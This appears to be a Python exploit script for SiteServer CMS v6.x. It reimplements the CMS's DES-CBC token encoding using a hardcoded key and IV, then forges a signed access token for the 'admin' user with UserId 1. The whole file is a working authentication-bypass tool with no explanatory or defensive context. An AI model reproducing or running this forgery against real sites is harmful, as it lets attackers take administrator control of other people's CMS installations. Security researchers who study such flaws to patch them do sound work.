#! /usr/bin/env python3
# -*- coding: utf-8 -*-

'           SiteServer CMS v6.x             '
'''     https://www.github.com/zrools     '''

import hmac, base64, hashlib, time
from Crypto.Cipher import DES


def encrypt(msg, key, iv):
    pad = 8 - len(msg) % 8
    for i in range(pad):
        msg = msg + chr(pad)

    obj = DES.new(key, DES.MODE_CBC, iv)
    buf = obj.encrypt(msg)

    txt = base64.b64encode(buf).decode()
    txt = txt.replace('+','0add0').replace('=','0equals0').replace('&','0and0')
    txt = txt.replace('?','0question0').replace("'",'0quote0').replace('/','0slash0')
    txt = txt + '0secret0'  # v6.x

    return txt


def decrypt(msg, key, iv):
    msg = msg.replace('0secret0','')
    msg = msg.replace('0add0','+').replace('0equals0','=').replace('0and0','&')
    msg = msg.replace('0question0','?').replace('0quote0',"'").replace('0slash0','/')

    obj = DES.new(key, DES.MODE_CBC, iv)
    txt = obj.decrypt(base64.b64decode(msg))

    return txt.decode('utf8')


def get_hmac(msg, key):
    return base64.b64encode(hmac.new(key, msg, digestmod=hashlib.sha256).digest())


def base64_url_encode(msg):
    msg = msg.replace('=', '').replace('+', '-').replace('/', '_')
    return msg


def get_access_token(userid, username, key, iv):
    ss_type = '{"typ":"JWT","alg":"HS256"}'
    ss_info = '{"UserId":%s,"UserName":"%s","ExpiresAt":"\/Date(%s)\/"}' % (userid, username, int(time.time()*1000))

    b64_type = base64.b64encode(ss_type.encode()).decode()
    b64_info = base64.b64encode(ss_info.encode()).decode()

    ss_msg = '{}.{}'.format(b64_type, b64_info)
    ss_res = get_hmac(base64_url_encode(ss_msg).encode(), key.encode()).decode()
    token = '{}.{}'.format(base64_url_encode(ss_msg), base64_url_encode(ss_res))

    return encrypt(token, key[:8], iv)


def main():
    iv = b'\x12\x34\x56\x78\x90\xAB\xCD\xEF'
    key = '6f2bc5f951826267'
    msg = 'ckhkjiP2arQ0equals00secret0'  # octM
    
    # txt = encrypt(msg, key[:8], iv)
    # txt = decrypt(msg, key[:8], iv)

    txt = get_access_token(1, 'admin', key, iv)
    
    print(txt)

 
if __name__=='__main__':
    main()


